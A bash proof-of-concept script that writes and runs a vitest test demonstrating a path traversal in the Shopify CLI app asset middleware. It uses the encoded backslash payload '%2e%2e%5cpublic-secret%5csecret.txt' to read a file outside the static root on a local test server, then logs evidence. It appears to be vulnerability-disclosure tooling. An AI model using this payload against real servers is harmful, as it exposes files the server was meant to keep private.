#!/usr/bin/env bash
set -u

FINDING_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$FINDING_DIR/../../.." && pwd)"
EVIDENCE_DIR="$FINDING_DIR/evidence"
TEST_REL="src/cli/services/dev/extension/server/__piolium_app_assets_poc.test.ts"
TEST_PATH="$REPO_ROOT/packages/app/$TEST_REL"
RESULT_JSON="$EVIDENCE_DIR/result.json"

mkdir -p "$EVIDENCE_DIR"
rm -f "$RESULT_JSON" "$EVIDENCE_DIR/healthcheck.log" "$EVIDENCE_DIR/impact.log" "$EVIDENCE_DIR/exploit.log"

cat > "$EVIDENCE_DIR/exploit.sh" <<EOF
#!/usr/bin/env bash
set -euo pipefail
"$FINDING_DIR/poc.sh"
EOF
chmod +x "$EVIDENCE_DIR/exploit.sh"

cleanup() {
  rm -f "$TEST_PATH"
}
trap cleanup EXIT

if [ ! -d "$REPO_ROOT/node_modules" ]; then
  if [ -x "$EVIDENCE_DIR/setup.sh" ]; then
    "$EVIDENCE_DIR/setup.sh" > "$EVIDENCE_DIR/setup.log" 2>&1
  else
    echo '{"status":"inconclusive","evidence":"node_modules missing","notes":"dependency setup script is unavailable"}'
    exit 0
  fi
fi

cat > "$EVIDENCE_DIR/env-info.txt" <<EOF
repo: $REPO_ROOT
node: $(node -v 2>/dev/null || echo unavailable)
pnpm: $(pnpm -v 2>/dev/null || echo unavailable)
os: $(uname -a 2>/dev/null || echo unavailable)
git: $(git -C "$REPO_ROOT" rev-parse --short HEAD 2>/dev/null || echo unavailable)
@shopify/app: $(node -e "const fs=require('fs');const p='$REPO_ROOT/packages/app/package.json';console.log(JSON.parse(fs.readFileSync(p)).version)" 2>/dev/null || echo unavailable)
h3: $(node -e "const fs=require('fs');const p='$REPO_ROOT/packages/app/node_modules/h3/package.json';console.log(JSON.parse(fs.readFileSync(p)).version)" 2>/dev/null || echo unavailable)
pathe: $(node -e "const fs=require('fs');const p='$REPO_ROOT/packages/cli-kit/node_modules/pathe/package.json';console.log(JSON.parse(fs.readFileSync(p)).version)" 2>/dev/null || echo unavailable)
EOF

cat > "$TEST_PATH" <<'EOF'
import {getAppAssetsMiddleware} from './middlewares.js'
import {describe, expect, test} from 'vitest'
import {createApp, createRouter, toNodeListener} from 'h3'
import {createServer} from 'node:http'
import {mkdtemp, mkdir, writeFile, rm} from 'node:fs/promises'
import {join} from 'node:path'
import {tmpdir} from 'node:os'

const evidenceDir = process.env.PIOLIUM_EVIDENCE_DIR
if (!evidenceDir) throw new Error('PIOLIUM_EVIDENCE_DIR is required')

describe('app static asset traversal PoC', () => {
  test('leaks a sibling-prefix file through the real app asset middleware', async () => {
    const root = await mkdtemp(join(tmpdir(), 'shopify-app-assets-poc-'))
    const publicDir = join(root, 'public')
    const secretDir = join(root, 'public-secret')
    const secretPath = join(secretDir, 'secret.txt')
    const marker = `PIOLIUM_APP_ASSETS_SECRET_${Date.now()}`

    await mkdir(publicDir, {recursive: true})
    await mkdir(secretDir, {recursive: true})
    await writeFile(join(publicDir, 'allowed.txt'), 'allowed asset')
    await writeFile(secretPath, marker)

    const app = createApp()
    const router = createRouter()
    router.use('/extensions/assets/:assetKey/**:filePath', getAppAssetsMiddleware(() => ({staticRoot: publicDir})))
    app.use(router)

    const server = createServer(toNodeListener(app))
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
    const port = (server.address() as {port: number}).port
    const base = `http://127.0.0.1:${port}`

    try {
      const healthUrl = `${base}/extensions/assets/staticRoot/allowed.txt`
      const health = await fetch(healthUrl)
      const healthBody = await health.text()
      await writeFile(
        join(evidenceDir, 'healthcheck.log'),
        [`GET ${healthUrl}`, `HTTP ${health.status}`, `body=${healthBody}`, `configured_static_root=${publicDir}`].join('\n') + '\n',
      )
      expect(health.status).toBe(200)
      expect(healthBody).toBe('allowed asset')

      const exploitPath = '/extensions/assets/staticRoot/%2e%2e%5cpublic-secret%5csecret.txt'
      const exploitUrl = `${base}${exploitPath}`
      const res = await fetch(exploitUrl)
      const body = await res.text()
      const confirmed = res.status === 200 && body === marker

      await writeFile(
        join(evidenceDir, 'impact.log'),
        [
          `configured_static_root=${publicDir}`,
          `outside_sibling_file=${secretPath}`,
          `request=GET ${exploitPath}`,
          `http_status=${res.status}`,
          `response_body=${body}`,
          `security_effect=${confirmed ? 'outside sibling file contents returned in HTTP response' : 'not confirmed'}`,
        ].join('\n') + '\n',
      )

      await writeFile(
        join(evidenceDir, 'result.json'),
        JSON.stringify({
          status: confirmed ? 'confirmed' : 'failed',
          evidence: confirmed ? 'sibling public-secret/secret.txt contents in HTTP body' : `HTTP ${res.status} without marker`,
          notes: 'Encoded backslashes become route filePath "..\\public-secret\\secret.txt"; pathe resolvePath normalizes them before the unsafe startsWith check.',
        }),
      )

      expect(res.status).toBe(200)
      expect(body).toBe(marker)
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()))
      await rm(root, {recursive: true, force: true})
    }
  })
})
EOF

set +e
(
  cd "$REPO_ROOT/packages/app" && \
  PIOLIUM_EVIDENCE_DIR="$EVIDENCE_DIR" pnpm exec vitest run "$TEST_REL" --config vite.config.ts --pool=forks
) > "$EVIDENCE_DIR/exploit.log" 2>&1
rc=$?
set -e

cat "$EVIDENCE_DIR/exploit.log"

if [ $rc -eq 0 ] && [ -s "$RESULT_JSON" ]; then
  cat "$RESULT_JSON"
  printf '\n'
else
  note="vitest exit code $rc; see evidence/exploit.log"
  printf '{"status":"failed","evidence":"exploit did not return marker","notes":%s}\n' "$(node -e 'console.log(JSON.stringify(process.argv[1]))' "$note")"
fi
